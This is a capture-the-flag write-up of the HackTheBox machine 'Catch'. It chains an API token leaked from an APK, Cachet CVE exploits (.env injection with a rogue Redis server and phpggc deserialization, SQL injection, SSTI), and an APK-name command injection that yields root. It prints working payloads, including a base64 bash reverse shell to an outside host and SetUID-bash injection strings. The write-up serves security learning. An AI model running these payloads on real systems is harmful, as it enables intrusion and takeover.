[HTB: Catch](#)




![](/img/catch-cover.png)

Catch requires finding an API token in an Android application, and using
that to leak credentials from a chat server. Those credentials provide
access to multiple CVEs in a Cachet instance, providing several
different paths to a shell. The intended and most interesting is to
inject into a configuration file, setting my host as the redis server,
and storing a malicious serialized PHP object in that server to get
execution. To escalate to root, I'll abuse a command injection
vulnerability in a Bash script that is checking APK files by giving an
application a malicious name field.

### nmap

`nmap` finds five open TCP ports, SSH (22) and four HTTP servers (80,
3000, 5000, 8000):

Based on the
[OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server)
and [Apache](https://packages.ubuntu.com/search?keywords=apache2) (TCP
80) versions, the host is likely running Ubuntu 20.04 focal.

### Website - TCP 80

#### Site

The website on TCP 80 is for Catch Global Systems:

![](/img/image-20220628165934096.png)

None of the links on the page lead anywhere, except for the "Download
Now" button, which downloads `catchv1.0.apk`.

#### Tech Stack

The response headers don't give much info at all. Guessing at the index
page, it does return as `index.php`, which is a bit surprising as the
page looks very static.

#### Directory Brute Force

I'll run `feroxbuster` against the site, and include `-x php` since I
know the site is PHP:



    oxdf@hacky$ feroxbuster -u http://10.10.11.150 -x php

Nothing interesting here.

### Gitea - TCP 3000

#### Site

There's a custom Gitea instance on TCP 3000:

![](/img/image-20220628170956050.png)

The bottom does has a Gitea version, 1.14.1, but I don't find any
vulnerabilities in this version that would have existed at Catches
creation.

They call it "Catch Repositories". Without an account, there's not much
to find. Under "Explore", in the "Users" tab, there's a single user,
root:

![](/img/image-20220628171045367.png)

Trying to visit the interactive Swagger API docs typically found with
Gitea (link at the bottom of the page) just loads an empty page:

![](/img/image-20220628172719111.png)

Looking at the link, it points to `http://gitea.catch.htb:3000`. I'll
add that to my `/etc/hosts` file, and start a subdomain brute force in
the background, but it doesn't find anything interesting.

Reloading the page as `http://gitea.catch.htb:3000/api/swagger` loads
the docs:


[![](/img/image-20220720204716788.png)](/img/image-20220720204716788.png)


[*Click for full
![image*](/img/image-20220720204716788.png)



#### Tech Stack

The HTTP headers have no `Server` header, which suggests perhaps it's
not using the same Apache service:



    HTTP/1.1 200 OK
    Content-Type: text.md; charset=UTF-8
    Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
    X-Frame-Options: SAMEORIGIN
    Date: Tue, 28 Jun 2022 21:09:50 GMT
    Connection: close
    Content-Length: 12125



My guess would be perhaps the Gitea container running in Docker. I won't
bother brute forcing here since it's a known software.

The bottom right side of the footer on the page does identify it as
version 1.14.1. That was released almost a [year
before](https://blog.gitea.io/2021/04/gitea-1.14.1-is-released/) Catch
was released on HTB. I don't see any obvious vulnerabilities in this
version.

### Let's Chat - TCP 5000

#### Site

The site on TCP 5000 calls itself "Let's Chat":

![](/img/image-20220628171409642.png)

#### Tech Stack

Just like Gitea, no `Server` header:



    HTTP/1.1 302 Found
    X-Frame-Options: SAMEORIGIN
    X-Download-Options: noopen
    X-Content-Type-Options: nosniff
    X-XSS-Protection: 1; mode=block
    Content-Security-Policy: 
    X-UA-Compatible: IE=Edge,chrome=1
    Location: /login
    Vary: Accept, Accept-Encoding
    Content-Type: text.md; charset=utf-8

    Date: Tue, 28 Jun 2022 21:13:16 GMT
    Connection: close



At the bottom right of the page, there is a link to the
[GitHub](https://github.com/sdelements/lets-chat) project for Let's
Chat. It looks to be a NodeJS application. If I had to guess, I'd say
this is likely another Docker container, but don't know this for sure.

I don't see any public vulnerabilities in this software.

### Cachet - TCP 8000

#### Site

This page provides a list of incident reports:


[![](/img/image-20220628172137885.png)](/img/image-20220628172137885.png)


[*Click for full
![image*](/img/image-20220628172137885.png)



At the bottom of the page, there's two links. "Subscribe" returns a 500
error. "Dashboard" redirects to `/auth/login` and presents a form:

![](/img/image-20220628172324304.png)

#### Tech Stack

At the bottom of the main page and over the login form both reference
Cachet. [Cachet](https://cachethq.io/) is an open source status page
system. Looking through their docs, it is built on PHP.

The HTTP headers show not only PHP, but also the Laravel framework:



    HTTP/1.1 200 OK
    Date: Tue, 28 Jun 2022 21:20:32 GMT
    Server: Apache/2.4.29 (Ubuntu)

    Vary: Accept-Encoding
    Content-Length: 8869
    Connection: close
    Content-Type: text.md; charset=UTF-8



#### Exploits

I am able to identify a few exploits against Cachet:

-   [Unauthenticated SQL
    Injection](https://github.com/advisories/GHSA-79mg-4w23-4fqc) in
    Version \<= 2.3.18 and dev 2.4. \[CVE-2021-39165\]
-   SSTI vulnerability, shown by the author of CVE-2021-39165. \[No
    CVE\]
-   Two RCE vulnerabilities and an information leak in 2.4, all
    described in [this
    post](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/).
    \[CVE-2021-39172, CVE-2021-39173, and CVE-2021-39174\]

I'll abuse all of these below.

### APK Reversing

#### Jadx

Recently I showed using `apktool` to decompile an Android APK in
[RouterSpace](/htb-routerspace.md#routerspaceapk---static).
I'll use [Jadx](https://github.com/skylot/jadx/releases) to open the
Android `.apk` file this time (I did show this in 2019 for the
[Flarebear](/flare-on-2019/flarebear.md#re) Flare-On challenge). After
unzipping the release and running `bin/jadx-gui`, I'll open
`catchv1.0.apk`. It shows the structure of the application:

![](/img/image-20220628174533116.png)

There's a *ton* of files, but starting with the `AndroidManifest.xml`
file will help orient:



    <?xml version="1.0" encoding="utf-8"?>
    <manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="32" android:compileSdkVersionCodename="12" package="com.example.acatch" platformBuildVersionCode="32" platformBuildVersionName="12">
        <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="32"/>
        <uses-permission android:name="android.permission.INTERNET"/>
        <application android:theme="@style/Theme_Catch" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:allowBackup="true" android:supportsRtl="true" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory">
            <activity android:name="com.example.acatch.MainActivity" android:exported="true">
                <intent-filter>
                    <action android:name="android.intent.action.MAIN"/>
                    <category android:name="android.intent.category.LAUNCHER"/>
                </intent-filter>
            </activity>
        </application>
    </manifest>



It shows the entry point at `com.example.acatch.MainActivity`. This
class is pretty simple. It's using the `WebView` class to load the
status page:

![](/img/image-20220628175210998.png)

It is referring to `status.catch.htb` without specifying a port, and
using `https`. So it's not directly connecting to the status page on
Catch.

I'll not find much else here looking at the code manually.

#### MobSF

The [Mobile Security
Framework](https://github.com/MobSF/Mobile-Security-Framework-MobSF)
provides an awesome environment for analyzing mobile binaries like
`.apk` files.

I'll download it with
`git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git`
, and then run the `setup.sh` script. Then I'll run `run.sh`, and it
starts on localhost TCP 8000. Visiting that offers the chance to upload
a binary:

![](/img/image-20220628180138891.png)

I'll give it `catchv1.0.apk`, and after a minute, it returns a very long
report:

![](/img/image-20220628180456615.png)

Towards the bottom, it shows "Hardcoded Secrets":

![](/img/image-20220628180421703.png)

It seems like some of the author's tokens got embedded into the
application. I don't yet have a Slack instance, so I'll put that token
aside for now.

I'll try the `gitea_token` in the Swagger docs, by adding it to the
`AuthorizationHeaderToken` section:

![](/img/image-20220628181239387.png)

When I try to execute `/user`, it returns that the token is invalid:

![](/img/image-20220628181428559.png)

It seems this isn't a valid token.

I'll abuse the Let's Chat token below.

## Multiple Paths

There are several neat paths to show for between enumeration and getting
a shell on the host system as will:

## Shell as will \[Intended\]

### Access to Cachet

#### Let's Chat API Access

The
[docs](https://github.com/sdelements/lets-chat/wiki/API%3A-Authentication)
for the Let's Chat API suggest that tokens can be used either as Basic
Auth by setting the token to the username, or as a Bearer Token. Given
that Bearer Token authentication is simpler, I'll try that first.

The API is broken down into "Rooms", "Messages", "Files", "Users", and
"Account". I'll start with `/rooms`, which should return a list of the
chat rooms. Trying this without the token returns unauthorized:



    oxdf@hacky$ curl http://10.10.11.150:5000/rooms 
    Unauthorized



I'll use the token from the Android application as an `Authorization`
header, and pipe into `jq` to make the output pretty:



    oxdf@hacky$ export token=NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==
    oxdf@hacky$ curl -s http://10.10.11.150:5000/rooms -H "Authorization: Bearer $token" | jq .

    ]



#### Enumerate Chat

There are three rooms, "status", "android_dev", and "employees".
`/rooms/[room id]/messages` will return the messages. I'll use some `jq`
foo to print the message and author id:



    oxdf@hacky$ curl -s http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages -H "Authorization: Bearer $token" | jq -c '. | reverse | .[] | [.text, .owner]'

    Permission denied, please try again.



But they do work to log into the Cachet instance on port 8000:

I'll get the messages from the other rooms, but nothing super
interesting.

### Shell as www-data in Container

#### CVE-2021-39172 Background

[This
post](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/)
from SonarSource goes into detail on three CVEs, including
CVE-2021-39172, which provides remote code execution. The idea is to
abuse the view used to update configuration details which end up in the
`.env` file used by Laravel. While only certain values are allowed to be
changed, but sending a value with newlines in it, the attacker is able
to add additional values to the file. In Laravel, the first instance of
a variable in the `.env` file is used, so as long as legit value being
abused it above the target value in the file, the attacker's version
will be utilized.

The suggested exploit is to change the `CACHE_DRIVER` key to a Redis
server under the attacker's control. In that Redis server, I'll cache a
serialized PHP attack payload that will result in execution when the
server connects and deserializes the payload.

#### Update .env

To exploit this, I'll go to "Settings" \> "Mail", and click "Save":

![](/img/image-20220629123929419.png)

In Burp, I'll find that request and send it to Repeater. The body of the
POST shows the different items that are to be updated in the `.env`
file:

![](/img/image-20220629124225233.png)

I'll change the `config[mail_driver]` to `config[cache_driver]` and
change `log` to:



    file
    REDIS_HOST=10.10.14.6
    REDIS_PORT=6379
    SESSION_DRIVER=redis



On sending this, I've injected three new configurations into the `.env`
file.

I'll open WireShark and filter on `tcp.port==6379`. If I browse to the
login page in a private browsing window (no cookies), I'll see traffic
as a new session is created:

![](/img/image-20220629132544985.png)

It's worth noting that this config change gets reset pretty quickly,
which is likely some kind of cleanup script to allow for multiple
players to exploit this at the same time on the same host.

#### Configure Redis

I'll need a copy of a Redis server locally to exploit this. I'll install
it with `sudo apt install redis-server -y` . I don't want this to run
regularly, so I'll stop and disable the service
(`sudo systemctl stop redis-server` and
`sudo systemctl disable redis-server`), and run it in the foreground
from the command line. I'll start the server with `--protected-mode no`
so that it listens on more than just local host:



    oxdf@hacky$ redis-server --protected-mode no
    95298:C 29 Jun 2022 16:49:58.756 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
    95298:C 29 Jun 2022 16:49:58.756 # Redis version=5.0.7, bits=64, commit=00000000, modified=0, pid=95298, just started
    ...[snip]...



Now it's listening on all interfaces:



    oxdf@hacky$ sudo netstat -tnlp | grep 6379
    tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      95298/redis-server  
    tcp6       0      0 :::6379                 :::*                    LISTEN      95298/redis-server



I'll connect to this server, and see there are no keys:



    oxdf@hacky$ redis-cli 
    127.0.0.1:6379> keys *
    (empty list or set)



If I re-poison the `.env` (it's timed out by now), and then refresh the
login page in the private window, there's now a session cached:



    127.0.0.1:6379> keys *
    1) "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34"
    127.0.0.1:6379> get "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34"
    "s:197:\"a:3:{s:6:\"_token\";s:40:\"R53GMtfMIuQmJIF3YtfQO31InoSm4faU3FtZmGJ9\";s:9:\"_previous\";a:1:{s:3:\"url\";s:39:\"http://status.catch.htb:8000/auth/login\";}s:6:\"_flash\";a:2:{s:3:\"old\";a:0:{}s:3:\"new\";a:0:{}}}\";"



I'll recognize that result as a serialized PHP object.

#### POC

[PHP Generic Gadget Chains](https://github.com/ambionics/phpggc), or
`phpggc`, is a tool for creating serialized attack payloads. I'll
`git clone` it into my `/opt` directory.

There's a bunch of payloads for Laravel:



    oxdf@hacky$ /opt/phpggc/phpggc -l | grep -i laravel
    Laravel/RCE1                              5.4.27                             RCE (Function call)    __destruct          
    Laravel/RCE10                             5.6.0 <= 9.1.8+                    RCE (Function call)    __toString          
    Laravel/RCE2                              5.4.0 <= 8.6.9+                    RCE (Function call)    __destruct          
    Laravel/RCE3                              5.5.0 <= 5.8.35                    RCE (Function call)    __destruct     *    
    Laravel/RCE4                              5.4.0 <= 8.6.9+                    RCE (Function call)    __destruct          
    Laravel/RCE5                              5.8.30                             RCE (PHP code)         __destruct     *    
    Laravel/RCE6                              5.5.* <= 5.8.35                    RCE (PHP code)         __destruct     *    
    Laravel/RCE7                              ? <= 8.16.1                        RCE (Function call)    __destruct     *    
    Laravel/RCE8                              7.0.0 <= 8.6.9+                    RCE (Function call)    __destruct     *    
    Laravel/RCE9                              5.4.0 <= 9.1.8+                    RCE (Function call)    __destruct



These are all payloads that will make use of functions available in the
application to get code running on deserialization.

On the GitHub page for Cachet, there's a couple references to Laravel:

[![](/img/image-20220629133553627.png)*Click
for full size
![image*](/img/image-20220629133553627.png)

These imply that it's using at least Laravel 5.7. `Laravel/RCE4` seems
to cover the range I'm targeting (5.4.0 \<= 8.6.9+), so I'll build a
payload to run `id`:



    oxdf@hacky$ /opt/phpggc/phpggc -a Laravel/RCE4 system id
    O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{S:9:"\00*\00events";O:31:"Illuminate\Validation\Validator":1:{S:10:"extensions";a:1:{S:0:"";S:6:"system";}}S:8:"\00*\00event";S:2:"id";}



I'll get a fresh session in the cache, and update it:



    127.0.0.1:6379> keys *
    1) "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34"
    127.0.0.1:6379> set "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34" 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{S:9:"\00*\00events";O:31:"Illuminate\Validation\Validator":1:{S:10:"extensions";a:1:{S:0:"";S:6:"system";}}S:8:"\00*\00event";S:2:"id";}'
    OK



Now when I refresh that login page again:

![](/img/image-20220629133839361.png)

RCE!

#### Shell

I'll base64-encode a [bash reverse
shell](https://www.youtube.com/watch?v=OjkVep2EIlw) adding a couple
extra spaces to get rid of `/` and `=` characters):



    oxdf@hacky$ echo "bash  -i >& /dev/tcp/10.10.14.6/443 0>&1 " | base64
    YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK



I don't need the `bash -c '[payload]'` because I'm going to pipe it into
`bash` after decoding.

I'll encode that into a PHP object:



    oxdf@hacky$ /opt/phpggc/phpggc -a Laravel/RCE4 system "echo 'YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK'|base64 -d|bash"
    O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{S:9:"\00*\00events";O:31:"Illuminate\Validation\Validator":1:{S:10:"extensions";a:1:{S:0:"";S:6:"system";}}S:8:"\00*\00event";S:78:"echo 'YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK'|base64 -d|bash";}



I'll re-poison the `.env` file, and refresh the page to get a session in
Redis:



    10.10.14.6:6379> keys *
    1) "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34"



I'll update it to the payload:



    10.10.14.6:6379> set "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34" 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{S:9:"\00*\00events";O:31:"Illuminate\Validation\Validator":1:{S:10:"extensions";a:1:{S:0:"";S:6:"system";}}S:8:"\00*\00event";S:78:"echo 'YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK'|base64 -d|bash";}'
    Invalid argument(s)



It fails, because there a `'` in the payload and wrapping the full
thing. I'll go back and escape the `'` with a `\`. Now it works:



    10.10.14.6:6379> set "laravel:rBjWQbicKo0nDt7IRC2jVI8kG0wReZuEfH7stO34" 'O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{S:9:"\00*\00events";O:31:"Illuminate\Validation\Validator":1:{S:10:"extensions";a:1:{S:0:"";S:6:"system";}}S:8:"\00*\00event";S:78:"echo \'YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK\'|base64 -d|bash";}'
    OK



I'll refresh the page, and it hangs. There's a shell at `nc`:



    oxdf@hacky$ nc -lnvp 443
    Listening on 0.0.0.0 443
    Connection received on 10.10.11.150 35616

    bash: no job control in this shell
    www-data@70e4165dab0b:/var/www.md/Cachet/public$



I'll upgrade my shell with `script` and `stty` ([shell upgrade
explained](https://www.youtube.com/watch?v=DqE6DxqJg8Q)):



    www-data@70e4165dab0b:/var/www.md/Cachet/public$ script /dev/null -c bash

### Shell as will on host

#### Enumeration

It's clear based the hostname that I'm not on the host:



    www-data@70e4165dab0b:/var/www.md/Cachet/public$ hostname
    70e4165dab0b



The IP is 172.17.0.8:



    www-data@70e4165dab0b:/$ ifconfig
    bash: ifconfig: command not found
    www-data@70e4165dab0b:/$ ip addr 
    bash: ip: command not found
    www-data@70e4165dab0b:/$ cat /proc/net/fib_trie        
    Main:
      +-- 0.0.0.0/0 3 0 5

               |-- 172.17.0.8
                  /32 host LOCAL
    ...[snip]...



The `.env` file is in `/var/www.md/Cachet`:



    www-data@70e4165dab0b:/var/www.md/Cachet$ cat .env 
    APP_ENV=production
    APP_DEBUG=false
    ...[snip]...



If I poison the file again, I can see where my payload is inserted,
taking precedence over the legit values:

![image*](/img/image-20220629140604591.png)

There's also DB creds for a user will:



    DB_DRIVER=mysql
    DB_HOST=localhost
    DB_UNIX_SOCKET=null
    DB_DATABASE=cachet
    DB_USERNAME=will
    DB_PASSWORD=s2#4Fg0_%3!
    DB_PORT=null
    DB_PREFIX=null



#### SSH

These creds work to SSH to the host:



    oxdf@hacky$ sshpass -p 's2#4Fg0_%3!' ssh will@10.10.11.150
    Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)
    ...[snip]...
    will@catch:~$



And grab `user.txt`:



    will@catch:~$ cat user.txt
    d081fca8************************



## Shell as will \[Alt #1\]

I'll use the same techniques [above](#access-to-cachet) to access Cachet
as john. But this time, I'll use the info leak CVE to get the
environment variables directly, skipping the need for RCE in the
container:

[![](/img/Catch-Flow-alt-1-16583671250132.png)*Click
for full size
![image*](/img/Catch-Flow-alt-1-16583671250132.png)

### CVE-2021-39174

This CVE is described in detail in the [same SonarSource
blog](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection/)
post. It's quite simple. Looking at the same form to change the mail
config, if something in the `.env` is stored as `${NAME}`, then it will
reference a previously defined name. Following the example in the post,
I'll set the Mail Host to `${DB_USERNAME}` and the Mail from Address to
`${DB_PASSWORD}`. On refreshing:

![](/img/image-20220629142517960.png)

This was a bit finicky. For reasons I can't explain, I would often have
to set this several times to get it to work.

### SSH

Just like above, I can use those creds to get a shell:



    oxdf@hacky$ sshpass -p 's2#4Fg0_%3!' ssh will@10.10.11.150
    Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)
    ...[snip]...
    will@catch:~$



## Shell as will \[Alt #2\]

This path still requires getting access to Cachet to get the API key,
but then uses SQL injection in the API plus server-side template
injection (SSTI) to get a shell in the container:

[![](/img/Catch-Flow-alt-2.png)*Click for
full size ![image*](/img/Catch-Flow-alt-2.png)

### Get API Key via SQLI

#### CVE-2021-39165

There's an unauthenticated SQL injection in Cachet. This means that I
can skip the Let's Chat part, and go read the database. The researcher
who discovered and reported CVE-2021-39165 has a [really detailed blog
post](https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.md)
about it (and more).

The SQL injection is boolean blind, which is to say, I get to ask yes or
no questions (like, is the first character in this column and row an
"a"?), and slowly figure out what's in the database. I'll use the POC
from the post to find the injection:



    oxdf@hacky$ sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --batch
    ...[snip]...
    sqlmap identified the following injection point(s) with a total of 92 HTTP(s) requests:
    ---
    Parameter: #1* (URI)
        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+'a'=? and 1=1) AND (SELECT 3497 FROM (SELECT(SLEEP(5)))gMJf)+--+
    ---
    ...[snip]...



Interestingly, it couldn't find a boolean injection, but only a
time-based one. I wasn't able to recreate the boolean injection manually
either. I think it's missing data in the database (because this is an
unintended path on a CTF box) that it would show or not show, and that's
why it fails. This is more of a pain (no threads), but will still work.

#### Enumerate DB

Because the injection is slow, I'll guess that the DB name is the same
as the
[example](https://github.com/CachetHQ/Cachet/blob/2.4/.env.example)
`.env` file, "cachet". There should be a `users` table that has hashes
and API keys. From [the
docs](https://docs.cachethq.io/docs/api-authentication), API keys are
created when the user is created:

> The API Token is generated at installation time for the main user or
> when a new team member is added to your status page and can be found
> on your profile page (click your profile picture to get there).

The `User` object ([defined
here](https://github.com/CachetHQ/Cachet/blob/2.4/app/Models/User.php))
has `username`, `password`, and `api_key` fields, among others. I would
normally dump the password, but I know from the chat leak that it's not
something I can crack. I'll dump the `username` and `api_key`:



    oxdf@hacky$ sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --batch -D cachet -T users -C username,api_key --dump
    ...[snip]...
    Database: cachet
    Table: users
    [2 entries]
    +----------+----------------------+
    | username | api_key              |
    +----------+----------------------+
    | john     | 7GVCqTY5abrox48Nct8j |
    | admin    | rMSN8kJN9TPADl2cWv8N |
    +----------+----------------------+



### Get API Key Via Profile

Alternatively, instead of using the SQL injection, I can use the Let's
Chat API to get john's password, shown [above](#enumerate-chat). Then,
logged in as john, visiting the Profile page shows the API key:

![](/img/image-20220629144543952.png)

### Generate Template

The [Cachet API docs](https://docs.cachethq.io/reference/ping) don't
show a way to create templates using the API. That means I'll need the
GUI access as john to do this part (though hit me up on Discord or
Twitter if you figured out how to do this with only an API key).

I'll use the POC from the [CVE-2021-39165
writeup](https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.md):



    {{["id"]|filter("system")|join(",")}}



I'll create a template named "id" with that as the body and click
"Create":

![](/img/image-20220629150159290.png)

### Trigger SSRF

Only the API triggers the SSRF. I'll use Repeater to send the request:

[![](/img/image-20220629150338651.png)*Click
for full size
![image*](/img/image-20220629150338651.png)

That's code execution. I can update this or create a new template with a
reverse shell payload, and it returns a shell in the container.

## Shell as root

### Enumeration

#### Filesystem

There's nothing interesting in `/home/will`. Looking around the file
system, there's two directories in `/opt`:



    will@catch:/opt$ ls
    containerd  mdm



There's a bunch of `docker-proxy` processes in the `ps auxww` output:

These are likely containers used to load-balance the Cachet step, so
that more players can solve the `.env` overwrite at the same time. I'm
not able to access the `containerd` folder as will.

`mdm` is more interesting. It has a shell script and an empty folder:



    will@catch:/opt/mdm$ ls
    apk_bin  verify.sh



#### Processes

To look at the running processes, I'll upload
[pspy](https://github.com/DominicBreuker/pspy) using `scp`:



    oxdf@hacky$ sshpass -p 's2#4Fg0_%3!' scp /opt/pspy/pspy64 will@10.10.11.150:/dev/shm/



On running it, I'll notice that `verify.sh` is running as root every
minute:



    2022/06/29 19:25:01 CMD: UID=0    PID=1000440 | /bin/bash /opt/mdm/verify.sh 



### verify.sh

#### General

The general structure of the file is to define four functions, and then
have a loop that calls them:



    #!/bin/bash

    ###################    
                                                     
    sig_check() {
    ...[snip]]]
    }

    comp_check() {     
    ...[snip]...
    }  

    ####################

    ...[snip]...
    }

    ###########
    # Cleanup #
    ###########

    cleanup() {
            rm -rf $PROCESS_BIN;rm -rf "$DROPBOX/*" "$IN_FOLDER/*";rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh)
    }


    ###################
    # MDM CheckerV1.0 #
    ###################

    DROPBOX=/opt/mdm/apk_bin
    IN_FOLDER=/root/mdm/apk_bin
    OUT_FOLDER=/root/mdm/certified_apps
    PROCESS_BIN=/root/mdm/process_bin

    for IN_APK_NAME in $DROPBOX/*.apk;do
            OUT_APK_NAME="$(echo ${IN_APK_NAME##*/} | cut -d '.' -f1)_verified.apk"
            APK_NAME="$(openssl rand -hex 12).apk"
            if [[ -L "$IN_APK_NAME" ]]; then
                    exit
            else
                    mv "$IN_APK_NAME" "$IN_FOLDER/$APK_NAME"
            fi
            sig_check $IN_FOLDER $APK_NAME
            comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN
            app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME
    done
    cleanup



It's looping over all the `.apk` files in `/opt/mdm/apk_bin`. For each,
it generates an output filename, by removing everything before the last
`/` (using
[var##word](https://tldp.org/LDP/Bash-Beginners-Guide.md/sect_10_03.md)),
splitting at `.`, and then adding `_verified.apk` to the end.

It checks if the file is a symbolic link, and if so, it exits.
Otherwise, it moves the APK into a folder in `/root`.

Then it calls `sig_check`, `comp_check`, and `app_check`. Once the loop
is complete, it calls `cleanup`.

#### app_check

The `app_check` function has a command injection vulnerability in it:



    app_check() {                                    
            APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml") 
            echo $APP_NAME
            if [[ $APP_NAME == *"Catch"* ]]; then
                    echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
                    mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
            else
                    echo "[!] App doesn't belong to Catch Global"
                    cleanup                      
                    exit
            fi
    }   



It uses `grep` to pull the name out of `strings.xml`, and then if
"Catch" is present in the name it makes a directory and moves the apk
into it.

To command inject, I'll just need to have the name get set to something
with a subshell (`$()`), and that will be executed.

### Command Injection

#### Edit APK

I'll use `apktool` to decompile the APK into its sources, as described
[here](https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82).
I'll grab the latest release
[here](https://github.com/iBotPeaches/Apktool/releases/tag/v2.6.1).
Because this APK isn't going to run on a device, I don't have to worry
about signing it.

I'll start by decompiling the app:



    oxdf@hacky$ java -jar apktool_2.6.1.jar d catchv1.0.apk -o decomp
    I: Using Apktool 2.6.1 on catchv1.0.apk
    I: Loading resource table...
    I: Decoding AndroidManifest.xml with resources...
    I: Loading resource table from file: /home/oxdf/.local/share/apktool/framework/1.apk
    I: Regular manifest package...
    I: Decoding file-resources...
    I: Decoding values */* XMLs...
    I: Baksmaling classes.dex...
    I: Copying assets and libs...
    I: Copying unknown files...
    I: Copying original files...



I'll verify that I can rebuild that with no changes, just to make sure
my system is working:



    oxdf@hacky$ java -jar apktool_2.6.1.jar b -f decomp/ -o test.apk
    I: Using Apktool 2.6.1
    I: Smaling smali folder into classes.dex...
    I: Building resources...
    I: Building apk file...
    I: Copying unknown files/dir...
    I: Built apk...
    oxdf@hacky$ rm test.apk 



I was getting errors at one point that kind of looked like [this
issue](https://github.com/iBotPeaches/Apktool/issues/1842), and were
fixed by running `apktool empty-framework-dir --force` as suggested
there.

I'll open `decomp/res/values/strings.xml` and edit the `app_name`:



        <string name="app_name">Catch$(cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf)</string>



This will copy `bash` into `/tmp` and make it SetUID to run as root.

Build it back up:



    oxdf@hacky$ java -jar apktool_2.6.1.jar b -f decomp/ -o modified.apk
    I: Using Apktool 2.6.1
    I: Smaling smali folder into classes.dex...
    I: Building resources...
    I: Building apk file...
    I: Copying unknown files/dir...
    I: Built apk...



#### Upload

I'll upload this to Catch using `scp`, right into the dropbox directory:



    oxdf@hacky$ sshpass -p 's2#4Fg0_%3!' scp modified.apk will@10.10.11.150:/opt/mdm/apk_bin/



#### Shell

Once a minute rolls over, I'll check, and there's a SetUID `0xdf` file
in `/tmp`:



    will@catch:/opt/mdm$ ls -l /tmp/0xdf
    -rwsrwxrwx 1 root root 1183448 Jun 29 20:16 /tmp/0xdf



Running it (with `-p` to not drop privs) gives a shell with euid of
root:



    will@catch:/opt/mdm$ /tmp/0xdf -p
    0xdf-5.0# id
    uid=1000(will) gid=1000(will) euid=0(root) groups=1000(will)



That's enough to read the flag:



    0xdf-5.0# cd /root
    0xdf-5.0# cat root.txt
